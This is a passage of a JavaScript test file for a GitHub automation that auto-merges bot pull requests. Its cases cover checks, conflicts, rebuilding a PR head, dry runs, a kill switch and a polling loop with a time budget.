            expect(x.st.bodies['PUT /pulls/662/merge']).toMatchObject({ merge_method: 'squash', sha: 'f570887' });
            expect(out.some((o) => o.action === 'merge')).toBe(true);
            expect(x.st.calls.some((c) => c.startsWith('POST /git/'))).toBe(false);   // nothing to rebuild
        });
        it('the PR with the state file is not merged until it has been rebuilt without it', async () => {
            const x = fake({ files: [css(), state()] });
            await go(x);
            expect(x.st.calls).toContain('POST /git/commits');
            // after the rebuild the file list the fake returns is still the old one, so the pass must not merge on stale information
            expect(x.st.calls).not.toContain('PUT /pulls/662/merge');
        });
        it('a failing required check, a conflict that cannot be rebuilt, or WF_AUTO_LANE=0: nothing is merged or rebuilt', async () => {
            const red = fake({ files: [css()], checks: [...green().filter((c) => c.name !== 'review'), chk('review', 'failure', { details_url: 'https://github.com/o/r/actions/runs/3/job/1' })] });
            await go(red);
            expect(red.st.calls).not.toContain('PUT /pulls/662/merge');
            const off = fake({ files: [css(), state()], mergeable: false });
            await go(off, { env: { ...env, WF_AUTO_LANE: '0' } });
            expect(off.st.calls.some((c) => c.startsWith('POST /git/') || c.startsWith('PUT /pulls/'))).toBe(false);
        });
        it('a head that moved while it was being read is never rebuilt over', async () => {
            const x = fake({ files: [css(), state()], mergeable: false });
            const moved = async (url, o) => (String(url).endsWith('/pulls/662') && (!o || !o.method || o.method === 'GET') && x.st.calls.includes('GET /contents/wf-agent-fixes.css') ? { ok: true, status: 200, text: async () => JSON.stringify(botPr({ head: { ref: 'ai-fix/issue-658-1795246408', sha: 'someone-else', repo: { full_name: 'o/r' } }, mergeable: false })) } : x.fetchImpl(url, o));
            await run({ env, fetchImpl: moved, log: () => {}, now: NOW, sleep: async () => {} });
            expect(x.st.calls).not.toContain('POST /git/commits');
        });
        it('a dry run says what it would do and changes nothing', async () => {
            const x = fake({ files: [css(), state()], mergeable: false });
            const lines = [];
            await run({ env, fetchImpl: x.fetchImpl, log: (m) => lines.push(m), now: NOW, dryRun: true, sleep: async () => {} });
            expect(lines.some((l) => /would rebuild the head/.test(l))).toBe(true);
            expect(x.st.calls.filter((c) => !c.startsWith('GET'))).toEqual([]);
        });
        it('mergeable still null right after the default branch moved: asks again and merges once GitHub knows', async () => {
            const x = fake({ files: [css()], mergeable: null });
            let reads = 0;
            const f = async (url, o) => {
                if (String(url).endsWith('/pulls/662') && (!o || !o.method || o.method === 'GET')) {
                    reads++;
                    if (reads >= 3) { const r = await x.fetchImpl(url, o); const b = JSON.parse(await r.text()); b.mergeable = true; return { ok: true, status: 200, text: async () => JSON.stringify(b) }; }
                }
                return x.fetchImpl(url, o);
            };
            const out = await run({ env, fetchImpl: f, log: () => {}, now: NOW, sleep: async () => {} });
            expect(reads).toBeGreaterThanOrEqual(3);
            expect(out.some((d) => d.action === 'merge')).toBe(true);
        });
        it('mergeable never decided: reports a wait the outer loop will look at again, merges nothing', async () => {
            const x = fake({ files: [css()], mergeable: null });
            const out = await run({ env, fetchImpl: x.fetchImpl, log: () => {}, now: NOW, sleep: async () => {} });
            expect(out.some((d) => d.action === 'wait' && /still running/.test(d.reason))).toBe(true);
            expect(x.st.calls).not.toContain('PUT /pulls/662/merge');
        });
        it('a refusal from GitHub on the merge is logged and the pass goes on', async () => {
            const x = fake({ files: [css()], mergeStatus: 405 });
            const lines = [];
            const out = await run({ env, fetchImpl: x.fetchImpl, log: (m) => lines.push(m), now: NOW, sleep: async () => {} });
            expect(lines.some((l) => /refused the merge/.test(l))).toBe(true);
            expect(Array.isArray(out)).toBe(true);
        });
    });
});

describe('runUntilSettled: the job that approves a PR also waits for its checks', () => {
    const waitRound = [{ pr: 660, issue: 659, action: 'wait', reason: 'checks are still running', failed: [] }];
    const mergeRound = [{ pr: 660, issue: 659, action: 'merge', reason: 'ok', failed: [] }];
    it('looks again while checks run, and stops once the PR is merged', async () => {
        const rounds = [waitRound, waitRound, mergeRound];
        let calls = 0, slept = 0, t = 0;
        const out = await runUntilSettled({ runOnce: async () => rounds[calls++], sleep: async (ms) => { slept++; t += ms; }, clock: () => t, log: () => {}, pollMs: 1000, budgetMs: 60000 });
        expect(calls).toBe(3);
        expect(slept).toBe(2);
        expect(out.some((d) => d.action === 'merge')).toBe(true);
    });
    it('does not loop when nothing waits on running checks', async () => {
        let calls = 0;
        await runUntilSettled({ runOnce: async () => { calls++; return [{ pr: 1, action: 'wait', reason: 'a person must approve', failed: [] }]; }, sleep: async () => {}, log: () => {} });
        expect(calls).toBe(1);
    });
    it('gives up when the time budget is spent and says so', async () => {
        let calls = 0, t = 0;
        const lines = [];
        await runUntilSettled({ runOnce: async () => { calls++; return waitRound; }, sleep: async (ms) => { t += ms; }, clock: () => t, log: (m) => lines.push(m), pollMs: 1000, budgetMs: 3500 });
        expect(calls).toBe(4);
        expect(lines.some((l) => /next scheduled run looks again/.test(l))).toBe(true);
    });
    it('a dry run is one pass', async () => {
        let calls = 0;
        await runUntilSettled({ runOnce: async () => { calls++; return waitRound; }, sleep: async () => {}, log: () => {}, dryRun: true });
        expect(calls).toBe(1);
    });
});
